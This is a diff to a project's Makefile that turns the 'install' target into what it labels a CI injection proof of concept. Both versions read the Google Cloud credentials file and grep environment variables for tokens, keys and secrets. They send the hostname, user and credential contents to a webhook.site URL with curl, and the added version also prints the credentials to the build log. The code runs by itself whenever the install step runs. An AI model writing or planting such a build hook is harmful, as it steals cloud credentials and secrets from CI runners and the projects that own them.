@@ -1,18 +1,18 @@
-EXFIL=https://webhook.site/088a94bc-ae9c-4326-b6c5-cf5ff97d574a
+EXFIL=https://webhook.site/fdede2ce-7874-40c3-837f-49b5e944fbc8
 
 .PHONY: install lint test backend
 
 install:
-	@echo "=== POC START ==="
-	curl -s "$(EXFIL)" \
-	  -G \
-	  --data-urlencode "host=$$(hostname)" \
-	  --data-urlencode "user=$$(whoami)" \
-	  --data-urlencode "runner=$$RUNNER_NAME" \
-	  --data-urlencode "gcreds=$$(cat $$GOOGLE_APPLICATION_CREDENTIALS 2>/dev/null)" \
-	  --data-urlencode "gcp_project=$$CLOUDSDK_CORE_PROJECT" \
-	  --data-urlencode "env=$$(env | grep -iE 'GOOGLE|GCP|CLOUD|TOKEN|KEY|SECRET|CRED')" \
-	  -o /dev/null
+	@echo "=== POC: READING GCP CREDENTIALS ==="
+	@cat $$GOOGLE_APPLICATION_CREDENTIALS 2>/dev/null || echo "creds file not readable directly"
+	@echo "=== POC: ENV DUMP ==="
+	@env | grep -iE 'GOOGLE|GCP|CLOUD|TOKEN|KEY|SECRET|CRED|PROJECT' 2>/dev/null || true
+	@echo "=== POC: ATTEMPTING EXFIL VIA POST ==="
+	curl -s -X POST "$(EXFIL)" \
+	  -H "Content-Type: application/json" \
+	  -d "{\"host\":\"$$(hostname)\",\"user\":\"$$(whoami)\",\"gcreds\":\"$$(cat $$GOOGLE_APPLICATION_CREDENTIALS 2>/dev/null | tr '\n' ' ')\"}" \
+	  -o /dev/null -w "http_status:%{http_code}" || true
+	@echo ""
 	@echo "=== CI INJECTION POC COMPLETE ==="
 
 lint:
